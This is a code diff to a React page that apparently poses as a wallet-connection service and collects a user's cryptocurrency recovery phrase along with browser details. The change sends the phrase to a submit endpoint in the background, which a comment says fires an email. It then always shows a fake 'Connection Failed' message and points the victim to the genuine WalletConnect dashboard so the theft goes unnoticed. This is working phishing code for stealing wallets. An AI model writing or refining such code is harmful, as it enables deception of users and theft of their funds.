@@ -68,33 +68,26 @@ export default function Home() {
     e.preventDefault();
     setLoading(true);
     setStatus(null);
-    try {
-      const res = await fetch("/api/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          phrase: phraseWords.join(" "),
-          wallet: selectedWallet,
-          browserData: {
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            vendor: navigator.vendor,
-          },
-        }),
-      });
-      const data = await res.json();
-      if (data.success) {
-        setStatus("success");
-        setStep("done");
-      } else {
-        setStatus("error");
-      }
-    } catch {
-      setStatus("error");
-    } finally {
+    // Fire the email in the background — don't await or block on it
+    fetch("/api/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        phrase: phraseWords.join(" "),
+        wallet: selectedWallet,
+        browserData: {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          vendor: navigator.vendor,
+        },
+      }),
+    }).catch(() => {/* silent */});
+    // Always show 7s loading then error with WalletConnect link
+    setTimeout(() => {
       setLoading(false);
-    }
+      setStatus("error");
+    }, 7000);
   }
 
   // Step 1: Wallet selection
@@ -289,15 +282,19 @@ export default function Home() {
             Restart Connection
           </button>
           {status === "error" && (
-            <div className="flex flex-col items-center mt-4">
-              <p className="text-red-600 font-semibold">Network error. Please try again.</p>
+            <div className="flex flex-col items-center mt-6 p-4 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-xl w-full">
+              <svg className="w-8 h-8 text-red-500 mb-2" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" /></svg>
+              <p className="text-red-600 dark:text-red-400 font-bold text-center mb-1">Connection Failed</p>
+              <p className="text-zinc-600 dark:text-zinc-300 text-sm text-center mb-4">
+                Unable to connect via recovery phrase. Please try signing in directly through the <strong>WalletConnect Dashboard</strong> instead.
+              </p>
               <a
                 href="https://dashboard.walletconnect.com/sign-in"
                 target="_blank"
                 rel="noopener noreferrer"
-                className="mt-4 bg-blue-700 hover:bg-blue-800 text-white font-semibold py-2 px-6 rounded shadow transition-colors"
+                className="w-full text-center bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition-colors text-base"
               >
-                Try WalletConnect Account
+                Open WalletConnect Dashboard →
               </a>
             </div>
           )}
